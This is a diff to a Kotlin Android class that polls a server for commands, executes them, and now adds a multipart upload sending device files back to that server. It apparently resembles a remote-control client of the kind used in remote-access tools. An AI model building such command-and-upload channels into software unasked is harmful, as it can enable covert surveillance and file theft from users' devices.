@@ -6,10 +6,10 @@ import okhttp3.HttpUrl.Companion.toHttpUrl
 import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.RequestBody.Companion.toRequestBody
 import org.json.JSONObject
+import java.io.File
 import java.io.IOException
 import java.util.concurrent.TimeUnit
 import java.util.concurrent.Executors
-
 import java.net.NetworkInterface
 import java.net.Inet6Address
 import java.net.Inet4Address
@@ -26,9 +26,9 @@ class PollingManager(
 ) {
     // Timeout lebih pendek untuk mode Turbo agar cepat reconnect jika putus
     private val client = OkHttpClient.Builder()
-        .connectTimeout(if (isTurbo) 10L else 30L, TimeUnit.SECONDS)
-        .readTimeout(if (isTurbo) 15L else 60L, TimeUnit.SECONDS)
-        .writeTimeout(20L, TimeUnit.SECONDS)
+        .connectTimeout(if (isTurbo) 10L else 20L, TimeUnit.SECONDS)
+        .readTimeout(if (isTurbo) 15L else 25L, TimeUnit.SECONDS)
+        .writeTimeout(30L, TimeUnit.SECONDS)
         .build()
 
     private val executor = Executors.newSingleThreadScheduledExecutor()
@@ -171,7 +171,10 @@ class PollingManager(
                                     val command = json.optString("command", "none")
                                     if (command != "none") {
                                         Log.i(TAG, "Executing: $command")
-                                        handler.handle(body) { result -> sendResponse(result) }
+                                        handler.handle(body, 
+                                            { result -> sendResponse(result) },
+                                            { json: String, file: File, field: String -> sendResponseMultipart(json, file, field) }
+                                        )
                                     }
                                 }
                             } catch (e: Exception) {
@@ -185,6 +188,34 @@ class PollingManager(
         } catch (e: Exception) {
             Log.e(TAG, "URL error: ${e.message}")
             scheduleNext(10000L)
+        }
+    }
+
+    fun sendResponseMultipart(jsonResponse: String, file: java.io.File, fieldName: String = "media_file") {
+        try {
+            val url = baseUrl.toHttpUrl().newBuilder()
+                .addPathSegment("response")
+                .addQueryParameter("client_id", clientId)
+                .addQueryParameter("auth", authToken)
+                .build()
+
+            val multipartBody = MultipartBody.Builder()
+                .setType(MultipartBody.FORM)
+                .addFormDataPart("json_data", jsonResponse)
+                .addFormDataPart(fieldName, file.name, RequestBody.create("application/octet-stream".toMediaType(), file))
+                .build()
+
+            val request = Request.Builder().url(url).post(multipartBody).build()
+            client.newCall(request).enqueue(object : Callback {
+                override fun onFailure(call: Call, e: IOException) {
+                    Log.e(TAG, "Failed to send multipart response: ${e.message}")
+                }
+                override fun onResponse(call: Call, response: Response) {
+                    response.close()
+                }
+            })
+        } catch (e: Exception) {
+            Log.e(TAG, "Multipart error: ${e.message}")
         }
     }
 
@@ -209,7 +240,6 @@ class PollingManager(
             })
         } catch (e: Exception) {}
     }
-
     private fun scheduleNext(delayMs: Long) {
         if (isRunning) {
             executor.schedule({ poll() }, delayMs, TimeUnit.MILLISECONDS)
